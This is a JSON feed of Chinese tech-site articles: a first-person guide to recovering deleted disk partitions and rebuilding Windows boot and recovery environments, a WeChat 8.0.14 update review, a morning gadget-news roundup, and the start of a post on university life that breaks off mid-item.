[{"title":"在误删硬盘所有分区后，我这样找回所有数据","date":"2021-09-27 06:32:28","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>或许，这个标题咋看起来有一点标题党的味道，但却是近日发生在我身上的真实事件——本意想要将自己手持的移动硬盘清空，却由于一念之差，将操作对象误选择为电脑内置的硬盘，导致意外删除了电脑系统内的所有分区。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/c69259961e343e37ca07a7ede02e61d8.png\"><figcaption>令人窒息的磁盘分区情况</figcaption></figure><p>不幸的是，当我反应过来时，新的分区表已经被写入硬盘，Windows 随即蓝屏并重启。<br>幸运的是，由于我对可能遭遇的意外情况作出了后备方案，因此这次看似灾难性的操作的唯一实质性代价就是花去了我两个小时的休闲时间。</p>\n<p>以下是我的事故经历应对方法。如果你遇到了类似情况，亦可参照这里的介绍，试图恢复数据。需要注意的是：这里介绍的方法不一定能够保证在任何情况下恢复被误删的数据。保证数据安全的主要且可靠方案是<strong>定期备份</strong>（我自己也有对重要数据定期执行间隔最多一周的冷备处理）。少数派内也有一篇相当优秀的备份指南，<a href=\"https://sspai.com/post/39591\">点这里直达</a>。</p>\n<p>数据无价。谨慎操作。</p>\n<h2>恢复经历</h2>\n<p>以下是我将电脑从瘫痪到恢复完毕的全过程。由于部分操作在操作时未能截图，因此下面的部分截图可能来自于互联网<sup class=\"ss-footnote\" href=\"\" title=\"已经在相应位置给出了引用来源信息。题图本体来自于精美无版权图像网站 Unsplash，感谢！\" footnote-id=\"1\">1</sup>。</p>\n<h3>立刻停止对硬盘的任何写操作</h3>\n<p>当发生对硬盘的误操作时，需要做出的第一个应急措施就是停止对硬盘所有可能的写操作。之所以这么做，是因为被删除的内容不会立刻从硬盘上被物理抹除<sup class=\"ss-footnote\" href=\"\" title=\"这么做是出于效率和寿命因素。如果想要体验完整的格式化操作（即完全抹除原有磁盘上的所有信息），你应该选择低级格式化工具。\" footnote-id=\"2\">2</sup>。通过阻止后续新内容对原有数据的覆盖，可以大幅增加误操作能被撤销的可能性<sup class=\"ss-footnote\" href=\"\" title=\"常规格式化操作一般只会覆写磁盘上的少量信息。因此，如果误操作后及时中止，是很有希望能够撤销误操作的。\" footnote-id=\"3\">3</sup>。</p>\n<p>在这里，由于我电脑上的 Windows 立刻蓝屏，因此所有操作系统级别的写操作随即中止<sup class=\"ss-footnote\" href=\"\" title=\"严格意义上，因蓝屏而生成的转储信息也会对硬盘进行写入操作。我在蓝屏后的操作是按电源键直接关机以跳过写入。\" footnote-id=\"4\">4</sup>。我只需关闭电源即可最大程度地阻止对硬盘的进一步写入。</p>\n<h3>进入维护系统</h3>\n<p>由于分区表已被破坏，预载在电脑里的系统实质上已经无法启动。为此，便需要借助已经提前在其它介质上准备好的恢复系统来进行恢复操作。在这里，我使用的是 Edgeless 维护盘。如有兴趣，我在少数派上编写了一篇关于它的介绍，<a href=\"https://sspai.com/post/68106\" target=\"_blank\">这里是它的传送门</a>。</p>\n<p>进入 BIOS，将 U 盘设定为第一启动项，即可重启进入 Edgeless PE 系统，并准备开始维护操作。</p>\n<h3>恢复误删分区</h3>\n<p>在这里，我使用 DiskGenius 专业版执行恢复操作。</p>\n<p>需要注意的是：DiskGenius 免费版并不能将识别到的分区恢复到硬盘内（这属于付费功能），因此请自行准备好标准或以上级别的授权<sup class=\"ss-footnote\" href=\"\" title=\"按照功能对比表，标准版不支持某些分区格式的恢复。请注意明确自己的需求。\" footnote-id=\"5\">5</sup>来执行恢复操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/1d7e05e606e385ca5b1897f16447b8ae.png\"><figcaption>不同版本的功能对比。截图来自于 DiskGenius 中文官网。你可以点击 <a href=\"https://www.diskgenius.cn/pro/details.php\" target=\"_blank\">DiskGenius 专业版注册前后功能对比</a> 查看详情</figcaption></figure><p>当然，也有一些免费（且开源）的软件能够助力恢复误删操作。为帮助抉择，我将在本文的末尾列出这些软件。但我个人并未在本次操作中实际测试它们的恢复效果，因此不对恢复数据的可能性做任何担保。</p>\n<p>下文将假定你已经拥有 DiskGenius 专业版。首先，在发生误删的磁盘上右键选择「搜索已丢失分区(重建分区表)」，分析丢失的分区结构。在实际测试中，除了一个被 LUKS 加密的 Linux 分区未能识别到，其余分区均在数秒内被准确找出。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/62b2431a9ac114f3f516de8c0a7db018.png\"><figcaption>右键之后弹出的菜单</figcaption></figure><p>在搜索过程中，DiskGenius 会在找到分区后弹出确认对话框。如果这是你需要的分区，点击「保留」即可继续。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/ef3f134238b3eb2ac794724d2f7de681.png\"><figcaption>一个搜索到分区的实例</figcaption></figure><p>在（可能漫长的<sup class=\"ss-footnote\" href=\"\" title=\"部分情况下，DiskGenius 会逐一扫描硬盘来寻找分区。此时耗时会比较长。\" footnote-id=\"6\">6</sup>）等待和确认过程后，能够恢复的分区便已经在软件中列出。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/8ccde27b7b519275ddc87cdc9802fd4c.png\"><figcaption>恢复结果示例。由于不方便演示，这里找了个免费版的来截图。<strong>实际用的时候请注意授权问题。</strong></figcaption></figure><p>之后，只需要点击左上角的「保存更改」，分区结构就成功恢复了。</p>\n<p>到这里，我长出了一口气。重要的分区都已准确无误的找回，看起来也没有什么明显的问题。本以为一切已经尘埃落定，只需重启即可万事大吉，但没想到这却仅仅是一个开始。</p>\n<h3>回滚系统</h3>\n<p>重启之后，迎接我的第一个画面并不是正常的启动界面，而是一个蓝屏，告诉我重要的启动文件已经缺失，因而无法正常进入系统。很不幸，看起来恢复的 Windows 并不能正常启动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/5daf43af6027d7c7ee5d247232cedb43\" alt=\"查看源图像\"><figcaption>图文部分相关。不代表当时的蓝屏错误 <a href=\"https://www.dafanqie.net/help/6.html\" target=\"_blank\">来源</a></figcaption></figure><p>理论上，这里可以通过覆盖升级的方式恢复损坏的文件。不过，出于时间成本的妥协（被恢复的系统可能还有更多未知损伤），我决定直接回滚到最近一次的系统备份。我重新进入了维护系统，将无法使用的 Windows 分区删除并重新分区后，使用 Dism++ 在分区上执行了恢复备份的操作。</p>\n<p>恢复备份的操作也并不复杂。首先，点击主界面上方的「恢复功能」，并找到「系统还原」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/53df9547a2cd94b599d9b1fe1d3bf090.png\"><figcaption>关于 Dism++ 的操作截图。没有来源。来源就是我自己</figcaption></figure><p>之后，会弹出一个对话框。由于是需要恢复先前的系统备份，因而先单击第一个「浏览」（也就是截图中标蓝的）按钮，选择备份文件所在的位置。我将镜像保存在了独立的外置硬盘内，你可以根据自己的实际情况灵活选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/87e0aeecf359441a1b1e87519e5301e5.png\"><figcaption>还原系统（aka 释放镜像）的对话框</figcaption></figure><p>之后，还需要确保待还原的磁盘分区选择正确。在这里，<code>C:</code> 已经是正确的位置，不必再修改。完整的操作录屏如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/9aee1772a91bd92e306d4cedb33e4476.gif\"><figcaption>操作录屏。需要注意的是：这里并不是在 PE 下操作的。实际操作时请注意环境区别。</figcaption></figure><p>之后，点击「确定」即可开始恢复进程。</p>\n<p>恢复很顺利。过了不到十分钟后，软件告诉我恢复完成。由于启动分区并未在当时发生肉眼可见的损伤，因而我认定不需要修复引导，便直接重启进入了恢复的系统。</p>\n<h3>异常的恢复结果</h3>\n<p>Windows 可以顺利开机。一切仿佛都恢复了正常。</p>\n<p>然而，系统未能自动开始 BitLocker 加密。在我的印象当中，如果系统正常恢复，Windows 会自动对新创建的系统分区执行加密操作。但这次没有。这让我怀疑恢复是否仍未完成。在试图手动执行 BitLocker 加密操作后，Windows 回报「找不到请求的系统设备」，我的顾虑成真。<sup class=\"ss-footnote\" href=\"\" title=\"我翻遍全网也没找到相应的错误截图... 而因为我自己也不便复现，所以这里没有相应的错误截图。十分抱歉！\" footnote-id=\"7\">7</sup>系统依旧存在还未修复的问题。</p>\n<h3>重建引导分区</h3>\n<p>在网上搜寻一番后，发现该问题出现的主要原因是引导记录故障，导致 Windows 无法正确识别磁盘。解决方案也很简单粗暴：重建引导分区，也就是俗称的 ESP 分区。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/a4d8e874bcf038a6f252a65d28054ded.png\"><figcaption>就是它啦！</figcaption></figure><p>为此，我第三次进入了维护系统，将原有的引导分区删除，并通过 DiskGenius 的重建 ESP/MSR 分区功能，重建了引导分区<sup class=\"ss-footnote\" href=\"\" title=\"为方便起见，这里的操作同时也创建了 MSR 分区。如果需要，可以选择不创建 MSR\" footnote-id=\"8\">8</sup>。下方是操作的完整录屏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/54b0c6cdb5a05576b7cd9f59c055820f.gif\"><figcaption>操作录屏。需要再次提醒的是：这里并不是在 PE 下操作的。实际操作时请注意环境区别。</figcaption></figure><p>新创建的分区是没有正确的引导信息的。为此，我使用 Dism++ 内置的「引导修复」功能，以将启动所必需的文件和信息写入到新创建的引导分区中。操作步骤如下图<sup class=\"ss-footnote\" href=\"\" title=\"通常情况下，Dism++ 会正确识别到启动分区。如果没有，则需要自行选择一个分区。\" footnote-id=\"9\">9</sup>：</p>\n<figure class=\"ss-imgRows\" figcaption=\"操作步骤截图~\"><img src=\"https://cdn.sspai.com/2021/09/24/b1238d0d473333b7b3f0c6b94365b7d0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/24/34b8c4c3b4cfb62fb2fdae62f32bdf2c.png\" alt=\"\"></figure><p>完成写入操作后，重启进入 Windows。BitLocker 已经自动启动加密进程，说明修复有效。</p>\n<h3>修复恢复分区</h3>\n<p>至此，如果不在意系统内置 WinRE 无法使用的情况，那么修复便可告一段落。不过，考虑到我有时会使用 WinRE 进行一些不依赖启动盘的维护操作，修复恢复环境是必要的。由于在回滚系统时，我一并将旧有的恢复分区删除，因此这里需要手动重建以恢复 WinRE。</p>\n<p>重建方法很简单。首先，在磁盘内新开一个大约 550MB 的 NTFS 分区<sup class=\"ss-footnote\" href=\"\" title=\"不建议小于 450MB。这是 Windows 10 默认为恢复分区开辟的分区大小值\" footnote-id=\"10\">10</sup>。格式化后，从 Windows 安装镜像 <code>install.wim</code> 内提取 <code>Winre.wim</code>，放在该分区内备用<sup class=\"ss-footnote\" href=\"\" title=\"位置不限。理论上任意合适的位置都可以放置 Winre.wim\" footnote-id=\"11\">11</sup>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/70fb1bf5149797b30e22a33c32a8e3cf.png\"><figcaption>Winre.wim 在 install.wim 中所处的位置</figcaption></figure><p>之后，打开具有管理员权限的 PowerShell，执行如下命令：</p>\n<pre class=\"language-shell\"><code> ReAgentc.exe /setreimage /path &lt;到 Winre.wim 的完整路径&gt;</code></pre>\n<p>这是设定恢复系统镜像位置的指令<sup class=\"ss-footnote\" href=\"\" title=\"不必担心指派盘符因变更而导致无法进入恢复环境。Windows 不依赖盘符记录恢复镜像的位置。\" footnote-id=\"12\">12</sup>。执行完毕后，该镜像文件会被设置隐藏和保护属性，因而它会从这个分区里「消失」。这是正常的，无需惊慌。</p>\n<p>之后，打开 DiskGenius，右键恢复分区，点击「隐藏分区」选项，并点击界面左上角的「保存更改」按钮，使操作生效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/7d3bc242b18e483973ee8915bebb4112.png\"><figcaption>右键菜单截图</figcaption></figure><p>随后，再次右键恢复分区，并点击「更改分区参数」选项。在「文件系统类型」下拉框内找到并选择「Microsoft recovery partition」，点击「确定」，并点击「保存更改」应用设置。</p>\n<figure class=\"ss-imgRows\" figcaption=\"更改分区参数的截图\"><img src=\"https://cdn.sspai.com/2021/09/24/3219a92c7ad5e55f62116a7d7d558a1a.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/24/3fbd7842ae2ab6ebb27a4b41f879c813.png\" alt=\"\"></figure><p><br>保存完毕后，回到带有管理员权限的 PowerShell，执行下列命令开启恢复环境：</p>\n<pre class=\"language-shell\"><code>ReAgentc.exe /enable</code></pre>\n<p><br>如果命令执行无误，恢复环境便已修复完毕并准备就绪。你可以在「高级选项」里使用你喜欢的修复方式了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/94d16e6b43bef8cdd0d525d1eebef199.png\"><figcaption>正确执行命令后的结果</figcaption></figure><p>至此，系统已经完全修复完毕。耗时总长两小时。可以放松紧张的神经了 😀</p>\n<h2>一点回顾</h2>\n<p>在整个修复过程中，起到关键性作用的还是我之前定期备份的系统镜像。很大程度上，如果我先前并没有备份，那么这次可能就需要花上大概一天左右的时间重装系统 + 安装和调试软件了。</p>\n<p>不过，这次修复系统的经历，让我忽然发现了在灾难性事故面前，除恢复备份以外的修复可能——直接试图找回被删除的分区。尽管因为一些因素，它没能在这次修复过程中帮太多忙。但是它和本次发挥作用的备份一样，说不定就能在哪一个瞬间派上用场。</p>\n<p>也许你会好奇：那个被一同删除的 Linux 分区怎么样了？答案是：被救回来了。如果好奇的话，我在原有分区的位置上创建了一个全新但未格式化的分区，之后使用磁盘软件 parted 成功读取到了该位置原有的分区数据，因而成功无损的修复了 Linux 分区。<sup class=\"ss-footnote\" href=\"\" title=\"该操作需要精确的知道分区所在的起始和终点位置。请勿依赖该功能恢复重要数据。我当时能这么操作纯属运气较好（起点挨着已有分区的右侧，终点是磁盘的物理终点）。\" footnote-id=\"13\">13</sup></p>\n<p>当然，这次修复历程也充分印证了备份的重要性。与其事后百般折腾，不如未雨绸缪。</p>\n<h2>替代软件</h2>\n<p>当然，也许你会希望用一些免费（且开源）的软件助力恢复误删分区数据。以下是软件列表：</p>\n<ul>\n<li>\n<a href=\"https://www.gnu.org/software/parted/\" target=\"_blank\">parted</a>。一款免费开源的分区软件，附带误删分区恢复功能。你还可以使用它的图形化版本 <a href=\"https://gparted.org/\" target=\"_blank\">gparted</a>。</li>\n<li>\n<a href=\"https://www.cgsecurity.org/wiki/TestDisk_CN\" target=\"_blank\">TestDisk</a>。一款免费开源的跨平台数据恢复软件，附带误删分区找回功能。</li>\n</ul>\n<p>需要注意的是：它们的恢复效果是<strong>不被保证的</strong>。你需要自行承担因使用它们而造成的<strong>任何风险</strong>。</p>\n<h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/39591\" target=\"_blank\">不想被勒索软件毁掉数据，就按照「3-2-1 原则」来备份文件</a></li>\n<li><a href=\"https://sspai.com/post/68106\" target=\"_blank\">快快应急，慢慢修复：你的专属 PC 急救包</a></li>\n<li><a href=\"https://sspai.com/post/63663\" target=\"_blank\">这个常被忽略的「小钥匙」，每个 Windows 用户都应该用起来</a></li>\n<li><a href=\"https://sspai.com/post/68718\" target=\"_blank\">心之所想、一键直达：你可能不知道的 Windows 快捷方式玩法</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68956"},{"title":"微信 8.0.14 更新：新增适老化「关怀模式」，「折叠群组」终上线","date":"2021-09-27 03:00:00","description":"\n<p>昨天，微信发布了 8.0.14 版本更新，本次更新的重点主要是是响应国家对手机 App 适老化的号召，推出了对长辈们更友好的「关怀模式」。除此之外，微信的本次更新还带来了一些细节上的调整，包括「折叠群组」和新的转发界面等。</p>\n<h2>关怀模式</h2>\n<p>在「设置 - 关怀模式」中，我们就能找到关怀模式的开关入口。点击进入后，微信对这一功能有简单的文字介绍。一句话来说就是，微信对整体的 UI 进行了整体的调整，让其中的文字、按钮等内容进行了放大处理，并且在颜色上加大了对比度，方便有需要的人群使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/e963f1d7368532f6ac2150c1de3b6ba9.PNG\"></figure><p>开启之后的对比效果，可以说是非常明显了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/eb0360c06c4e02519884fe94d65ad97c.PNG\"></figure><p>但需要注意的一点是，缩放之后必然会造成内容密度的降低，在小屏的手机上就显得尤为「致命」。另外，如果是大段的文字内容，就容易出现显示不全或频繁换行的问题。这些问题除了用更大屏幕的设备之外，几乎没有有效的解决途径，具体就要看用户如何取舍了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/81f703aae73cd6ae3c26c14eb8605251.PNG\"></figure><h2>发现页管理</h2>\n<p>在这个版本的微信中，微信将原本「设置 - 新消息通知」的更新提醒删去，移到了「设置 - 通用 - 发现页管理」中，并对这个页面内进行了更新。</p>\n<p>在新版的发现页管理中，点击任意一个功能列表中的任意一个选项，即可设定是否在发现页显示，并可直接设定是否开启新内容通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/f11afc7d17cfaedc3a47a5bec1c2d5a0.PNG\"></figure><p>从使用体验的角度来说，这样减少了操作步骤，也更加符合了操作逻辑，算是一个小进步吧。</p>\n<h2>折叠群聊</h2>\n<p>对于如今越来越多人用微信工作，随便一个项目就建了几十个群，或者类似不到五个人的小团队里拉出十多个群聊的问题。微信在这一次 8.0.14 版本的更新里，也算是通过「折叠群聊」的功能给了一个曲线救国的「解决方案」。</p>\n<p>对于不想看到的，或基本不需要太关注新消息的群，你都可以将它们折叠起来了。在任意群聊中进入聊天信息页面，将下方的「折叠该群聊」开关打开，即可收入到「折叠的群聊」列表中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/0f2683129606f74d5a0b1a3a3303ddc5.png\"></figure><p>请注意，如果你开启了群通知，那么默认不支持折叠。而折叠之后的群聊也不支持置顶。</p>\n<h2>新的转发界面</h2>\n<p>除了上面的更新之外，另一个比较明显能感知到的更新，便是和 iOS 系统 Share Sheet 有着异曲同工之妙的新转发界面。</p>\n<p>如果我们在聊天中转发内容，则会在上方显示一个横向排列的「最近转发」列表。同时，原本置顶且硕大的「创建新的聊天」也缩小到了最近聊天列表的右上角，更像是一个按钮了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/013291d73b4f08ea47b909db11ba1359.png\"><figcaption>左：微信 8.0.13，右：微信 8.0.14</figcaption></figure><p>这一特性也应用在了公众号文章、视频、音乐等内容页面中 —— 点击右上角的更多按钮，弹出的分享卡片上方也出现了最近转发的好友列表，点击即可一键转发分享。</p>\n<h2>传闻中的功能和问题</h2>\n<p>除了上面提到的更新外，传闻中的<strong>电脑自动登录微信</strong>的诺奖级更新，目前似乎仍在<strong>小范围内测</strong>中，这个版本并没有任何支持的迹象，可以等待后续版本的发布。</p>\n<p>CallKit 的支持也依然遥遥无期，尽管切换为 WeChat 后可以开启，但对应一些小程序如健康码、通行卡等非常可能会出现问题，因此在如今的环境下并不建议切换数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/d81d344a7af418537667fcf5f4ca1657.PNG\"></figure><p>最后，微信内部的一些 UI 界面其实出现了两套逻辑，一套是以往 iOS 7 - iOS 14 时代的贯穿式列表，例如设置、发现等绝大部分页面；而在视频号的页面内，则是出现了 iOS 15 风格的卡片式列表。不知道这是微信团队有意为之，还是其它原因导致的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/c6cebfc0e7f13080554a2b8c786f61bb.PNG\"></figure><p>此外，在一些更深度的页面，例如就在全新分享页面里，点击最近聊天列表右上角的「创建新的聊天」按钮之后，又会看到十分古早的联系人选择界面……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/0c0ee6618c9b8b64eaeaf4710e47e965.png\"><figcaption>左：更新设计语言后的界面；右：古早时代的微信设计语言</figcaption></figure><p>希望微信团队在冲击诺奖级更新的时候，也能抽空改一改这些 UI 设计上小问题吧。虽然它们不影响使用，但还是会带来不小的割裂感。</p>\n<p>你还在微信 8.0.14 中发现了哪些更新？欢迎在评论区与我们一同分享。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68994"},{"title":"派早报：OPPO 发布 K9 Pro 等多款新品、荣耀发布 MagicBook V 14/16 系列等多款新品等","date":"2021-09-27 00:40:30","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>OPPO 发布 K9 Pro 等多款新品</h3>\n<p>9 月 26 日，OPPO 正式举办「未来玩机」发布会并推出多款新品。其中 OPPO K9 Pro 5G 搭载天玑 1200 处理器，配有 6.43 英寸 120Hz 高刷 AMOLED 显示屏并采用金刚石「固液双态」散热系统；摄像方面，OPPO K9 Pro 主摄采用 6400 万 6P 镜头，前置采用了 1600 万像素 f/2.4 人像镜头；续航方面配备 4500mAh 电池，支持 60W 超级闪充。OPPO K9 PRO 提供黑曜武士和冰河序曲两种配色、8+128GB 和 12+256GB 两个版本可选，售价 2199 元起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/article/ece72dc7253d82246bb30b8c29cd5b36\"></figure><p>除此之外，OPPO 还在本次发布会上推出了 <a href=\"https://www.oppo.com/cn/accessories/oppo-watch-free/\" target=\"_blank\">OPPO Watch Free</a> 智能手表和 <a href=\"https://www.oppo.com/cn/accessories/oppo-tv-k9-75/\" target=\"_blank\">OPPO 智能电视 K9</a>（75 英寸）。<a href=\"https://www.oppo.com/cn/smartphones/series-k/k9-pro/specs/\" target=\"_blank\">来源</a></p>\n<h3>荣耀发布 MagicBook V 14/16 系列等多款新品</h3>\n<p>9 月 26 日晚，荣耀正式发布 MagicBook V 14/16 系列等多款新品。</p>\n<p>其中 MagicBook V 14 采用 14.2 英寸 3:2 比例 LTPS 屏幕，分辨率为 2.5K，刷新率为 90Hz，支持十点触控；机身重量为 1.48kg，整机厚度为 14.5mm；配备 5MP 广角摄像头、红外暗光相机和四喇叭、四麦克风，支持定向拾音和 5 米范围的远场拾音；其它配置方面，MagicBook V 14 搭载英伟达 GeForce MX450 独显、16GB 内存和 512GB 硬盘，最高可选英特尔第 11 代 i7 处理器，售价 6199 元起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/article/d201bb42de72566d980bd85934b290e0\"></figure><p>MagicBook V 14</p>\n<p>MagicBook V 16 搭载 16.1 英寸 144Hz 刷新率、1080P 分辨率屏幕，机身重量为 1.84kg，厚度为 18.2mm，支持 135W 快充，同时有双 USB-C、双 USB-A、HDMI 2.0 和 3.5mm 耳机/话筒一体插孔，其它配置方面，MagicBook V 16 可选 AMD Ryzen 5/7 处理器，全系标配 16GB 内存和 512GB 硬盘，标准版使用集成显卡，售价 4999 元起；同时也有配备 GTX 1650 或 RTX 3050 独显的 Pro 款可供选择，售价 6199 元起。</p>\n<p>此外，荣耀也在本次发布会上推出了 <a href=\"https://www.hihonor.com/cn/products/tablets/honor-pad-v7/\" target=\"_blank\">荣耀平板 V7</a>、<a href=\"https://www.hihonor.com/cn/products/wisdom-screen/honorsmartscreen-x2/\" target=\"_blank\">荣耀 X2 </a>智慧屏电视等多款新品。<a href=\"https://cn.engadget.com/honor-magicbook-v-14-16-series-141915047.html\" target=\"_blank\">来源</a></p>\n<h3>三星公布 Galaxy M52 5G 相关信息</h3>\n<p>SamMobile 报道称，目前三星已经在其波兰和德国官网同时上线了 Galaxy M52 的相关页面，从三星官方公布的信息来看，该设备将采用 6.7 英寸 Super AMOLED FHD 显示屏，搭载高通骁龙 778G 处理器；摄像方面采用了 6400 万 像素主摄和 3200 万像素前置摄像头。Galaxy M52 预计将于 9 月 28 日面向欧洲市场正式发布。<a href=\"https://www.sammobile.com/news/galaxy-m52-5g-official-europe-does-not-have-3-5mm-port/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/article/ce896a5f1a37dece8c3ef87916513ff8\"></figure><h3>Google 公布 Manifest v3 扩展规范过渡计划</h3>\n<p>Google 于 9 月 26 日宣布，Chrome 扩展将从原先的 Manifest v2 逐步过渡到 Manifest v3，Chrome 网上应用店将从 2022 年 1 月 17 日开始不再接受使用旧标准构建的扩展，现有扩展更新依旧可以提交；2023 年1 月开始，Chrome 网上应用商店将不再支持 Manifest v2 扩展，届时开发者将无法提交基于 Manifest v2 标准的扩展更新。<a href=\"https://9to5google.com/2021/09/23/chrome-manifest-v2-extensions/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul><li>OnLeaks 曝光的最新渲染图显示，三星 Galaxy S22 系列将采用四等边设计，Galaxy S22 Ultra 则会提供 S-Pen 收纳槽。<a href=\"https://cn.engadget.com/samsung-galaxy-s22-plus-ultra-design-leaks-060010036.html\" target=\"_blank\">来源</a>\n</li></ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>八折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>\n<a href=\"https://emojipedia.org/mobile-phone/\" target=\"_blank\">📱</a> 你有同时用两部手机的习惯或者经历吗？不妨去 <a href=\"https://sspai.com/bullet/1632293763\" target=\"_blank\">一派</a> 和大家聊聊你是怎么用它们。</li>\n<li>🦦 十一将至，贴心水獭为即将出门远行的你带来了些 <a href=\"https://sspai.com/post/68979\" target=\"_blank\">好东西</a>。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68920\" target=\"_blank\">🍔 人在北京，想吃汉堡：我的探店与踩坑经历</a></li>\n<li>\n<a href=\"https://sspai.com/post/68959\" target=\"_blank\">🖥️ </a><a href=\"https://sspai.com/post/68960\" target=\"_blank\">20 年前的「网络电脑」和搁浅的「网上冲浪自由」</a>\n</li>\n<li>\n<a href=\"https://sspai.com/post/68905\" target=\"_blank\">✍️ </a><a href=\"https://sspai.com/post/68953\" target=\"_blank\">莫谓字母无机巧，铁画银钩见锋芒：西文书法（Calligraphy）初探</a>\n</li>\n<li><a href=\"https://sspai.com/post/68779\" target=\"_blank\">💻 通知推送、文件互传…… 免费好用的桌面 / 移动端协同工具：KDE Connect</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68995"},{"title":"即将步入大学的你对大学生活有哪些期待？作为过来人对准大学生又有什么祝福与建议？","date":"2021-09-26 12:26:12","description":"\n<p>中南大学李铭泽，中南大学外国语学院团委学生会青年志愿者协会部长；YoungsBlood青年组织活动执行与人力资源管理负责人，全国大学生非遗保护组织CEO、创始人；现任中南大学国际组织人才培养朋辈导师。李铭泽参与国际论坛与元首会见10余场，国际交流5次，组织校内国际组织活动3次，带领1000余名中南学子探索国际组织；曾赴美国纽约联合国总部实习，在联合国会议发言，讲述中国故事，展现中南风采。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1841f40944f493de47031e65e7862ec2_720w.jpg?rss\" data-caption=\"\" 